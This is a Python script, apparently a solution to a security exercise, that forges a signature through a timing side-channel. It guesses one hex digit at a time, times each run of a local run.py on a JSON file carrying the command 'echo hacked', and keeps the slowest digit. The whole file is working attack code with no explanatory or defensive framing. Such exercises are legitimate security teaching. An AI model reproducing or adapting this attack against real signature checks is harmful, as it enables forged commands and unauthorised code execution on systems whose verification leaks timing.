import json
import time
import commands

MY_SCRIPT_PATH = 'my_script.json'  # path of my script file
EXAMPLE_SIG = "6c68e3c88a87339fa8667cb36c82d4cf0bdcc131efcf98eb8df1867122e66e0e2e9d8d1ce01c40261fb8bde61a7768215c20febc2cd522af3a2232be73cabe3ada6d86b1635a52c787bd7d97985f4ce2ef9b47ea0c72bdb35b702f9169218adc2d4cd53eabfc3c875bef05270b703d407afb5b22198d56f3489ec8e3241c19a9"
POSSIBLE_DIGITS = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']  # all possible hex digits


def generate_exploit(signature):
    return json.dumps({'command': 'echo hacked', 'signature': signature})


def write_script_to_file(signature):
    script = generate_exploit(signature)
    with open(MY_SCRIPT_PATH, 'w') as writer:
        writer.write(script)


def get_max_and_index(times):
    max_time = max(times)
    for i in range(len(times)):
        if max_time == times[i]:
            return (max_time, i)


def main():
    # curr_sig = EXAMPLE_SIG
    curr_sig = '0' * 255
    times = [0 for i in range(16)]  # times[i] is the time it took to run when adding digit hex(i)
    for i in range(255):
        for digit in POSSIBLE_DIGITS:  # 0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f
            print("current digit added: " + digit)
            tmp_sig = curr_sig[:i] + digit + curr_sig[i + 1:]  # implant temp digit in current signature
            print("current signature: " + tmp_sig)
            write_script_to_file(tmp_sig)  # write new script to file
            start = time.time()
            exec_output = commands.getstatusoutput('python run.py ' + MY_SCRIPT_PATH)  # execute run.py on new signature
            end = time.time()
            if(exec_output[1] == 'hacked'):
                print(exec_output[1])
            elapsed = end - start  # time it took to execute the run.py
            print(elapsed)
            times[int(digit, 16)] = elapsed  # store for digit i the time it took with it

        max_time, max_index = get_max_and_index(times)
        chosen_digit = POSSIBLE_DIGITS[max_index] #chose the digit with the maximum time elapsed
        print("")
        print(chosen_digit)
        print(max_time)
        curr_sig = tmp_sig = curr_sig[:i] + chosen_digit + curr_sig[i + 1:]


if __name__ == "__main__":
    main()
